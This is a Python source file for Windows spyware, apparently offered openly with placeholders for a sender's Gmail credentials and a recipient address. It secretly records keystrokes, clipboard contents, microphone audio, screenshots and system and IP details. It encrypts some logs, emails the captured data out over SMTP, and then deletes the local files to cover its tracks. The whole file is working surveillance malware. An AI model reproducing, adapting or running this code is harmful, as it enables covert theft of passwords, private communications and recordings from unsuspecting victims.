# Author: AIwolfie

import os
import time
import socket
import platform
import getpass
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from multiprocessing import freeze_support
from PIL import ImageGrab

# File names
key_log_file = "keystrokes.txt"
system_info_file = "sys_info.txt"
clipboard_file = "clipboard_data.txt"
audio_recording_file = "recorded_audio.wav"
screenshot_file = "screenshot_capture.png"

encrypted_files = {
    "keys": "enc_keystrokes.txt",
    "system": "enc_sys_info.txt",
    "clipboard": "enc_clipboard_data.txt"
}

record_duration = 10  # Seconds for audio recording
log_interval = 15     # Interval for each logging session (seconds)
session_count = 3     # Number of logging sessions

email_sender = ""  # Enter disposable email here
email_password = ""  # Enter email password here
recipient_email = ""  # Email to send logs to
encryption_key = ""  # Enter encryption key

log_directory = ""  # Set the directory for saving logs
path_separator = "\\"
log_path = log_directory + path_separator

# the Email function
def send_email(subject, filename, filepath, recipient):
    try:
        msg = MIMEMultipart()
        msg['From'] = email_sender
        msg['To'] = recipient
        msg['Subject'] = subject

        body = "Find the attached file."
        msg.attach(MIMEText(body, 'plain'))

        with open(filepath, 'rb') as attachment:
            payload = MIMEBase('application', 'octet-stream')
            payload.set_payload(attachment.read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(payload)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(email_sender, email_password)
            server.sendmail(email_sender, recipient, msg.as_string())

    except Exception as e:
        print(f"Email sending failed: {e}")

# This Gathers system information
def log_system_info():
    try:
        with open(log_path + system_info_file, "w") as sys_file:
            sys_file.write(f"User: {getpass.getuser()}\n")
            sys_file.write(f"Hostname: {socket.gethostname()}\n")
            sys_file.write(f"Private IP: {socket.gethostbyname(socket.gethostname())}\n")
            try:
                public_ip = get("https://api.ipify.org").text
                sys_file.write(f"Public IP: {public_ip}\n")
            except Exception:
                sys_file.write("Public IP: Unavailable\n")
            sys_file.write(f"System: {platform.system()} {platform.version()}\n")
            sys_file.write(f"Processor: {platform.processor()}\n")
            sys_file.write(f"Machine: {platform.machine()}\n")
    except Exception as e:
        print(f"System info logging failed: {e}")

# This Records clipboard data
def log_clipboard():
    try:
        with open(log_path + clipboard_file, "w") as clip_file:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clip_file.write(f"Clipboard Content:\n{clipboard_data}")
    except:
        with open(log_path + clipboard_file, "w") as clip_file:
            clip_file.write("Clipboard data unavailable.")

# Capture audio
def record_audio():
    try:
        fs = 44100
        audio = sd.rec(int(record_duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(log_path + audio_recording_file, fs, audio)
    except Exception as e:
        print(f"Audio recording failed: {e}")

# Take a screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(log_path + screenshot_file)
    except Exception as e:
        print(f"Screenshot capture failed: {e}")

# Log keystrokes
def log_keystrokes():
    def on_press(key):
        try:
            with open(log_path + key_log_file, "a") as key_file:
                if hasattr(key, 'char') and key.char:
                    key_file.write(key.char)
                elif key == Key.space:
                    key_file.write(' ')
                else:
                    key_file.write(f'[{key}]')
        except Exception as e:
            print(f"Keystroke logging error: {e}")

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Encrypt files
def encrypt_files():
    try:
        cipher = Fernet(encryption_key)
        for original, encrypted in zip([system_info_file, clipboard_file, key_log_file], encrypted_files.values()):
            with open(log_path + original, 'rb') as original_file:
                encrypted_data = cipher.encrypt(original_file.read())
            with open(log_path + encrypted, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
    except Exception as e:
        print(f"Encryption failed: {e}")

# Clean up log files
def clean_up_logs():
    for file in [system_info_file, clipboard_file, key_log_file, screenshot_file, audio_recording_file]:
        try:
            os.remove(log_path + file)
        except Exception as e:
            print(f"Cleanup failed for {file}: {e}")

# Main execution loop
def main():
    log_system_info()
    log_clipboard()
    record_audio()
    capture_screenshot()

    session_counter = 0
    while session_counter < session_count:
        log_keystrokes()
        capture_screenshot()
        send_email("Screenshot Captured", screenshot_file, log_path + screenshot_file, recipient_email)
        session_counter += 1

    encrypt_files()
    for enc_file in encrypted_files.values():
        send_email("Encrypted Log", enc_file, log_path + enc_file, recipient_email)

    time.sleep(60)
    clean_up_logs()

if __name__ == "__main__":
    freeze_support()
    main()
